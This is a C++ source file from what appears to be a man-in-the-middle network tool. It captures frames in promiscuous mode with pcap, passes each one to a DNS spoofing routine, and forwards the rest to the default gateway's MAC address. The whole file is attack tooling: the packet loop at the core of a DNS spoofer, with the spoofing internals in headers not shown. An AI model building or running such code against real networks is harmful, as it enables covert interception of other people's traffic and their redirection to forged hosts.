#include "forwarder_and_dns_spoofer.h"
#include "../helper.h"

#include "filter.h"
#include "forwarder.h"
#include "dns_spoofer.h"

#include <pcap.h>

char *g_interface_name;
char *g_default_gateway_mac;

void forward_and_dns_spoof(char *interface_name, char *default_gateway_mac) {
    // Globals have to assigned to pass values to trap() handler function
    g_interface_name = interface_name;
    g_default_gateway_mac = default_gateway_mac;

    // Init pcap
    static char *errbuf = (char *) (malloc(PCAP_ERRBUF_SIZE));                   // alloc memory for error buffer
    static pcap_t *handle = pcap_create(interface_name, errbuf);                 // alloc for handler
    pcap_set_promisc(handle, 1); // TODO czy to musi być promisc mode?
    pcap_set_snaplen(handle, 65535);                                             // frame length
    pcap_activate(handle);

    // Init pcap filter:
    bpf_u_int32 netp, maskp;
    pcap_lookupnet(interface_name, &netp, &maskp, errbuf);   // get filter args
    std::string filter = createFilter(interface_name);
    struct bpf_program fp;
    pcap_compile(handle, &fp, filter.c_str(), 0, netp);      // compile filter
    if (pcap_setfilter(handle, &fp) < 0) {
        pcap_perror(handle, "pcap_setfilter()");
        exit(EXIT_FAILURE);
    }
    pcap_loop(handle, -1, trap, nullptr);                    // run trap
}


void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *frame) {
    if (handle_dns_spoofing(frame, g_interface_name)) {
        printf("DNS spoofing!\n");
    } else {
        forward_frame(frame, h->caplen, g_interface_name, g_default_gateway_mac);
    }
}

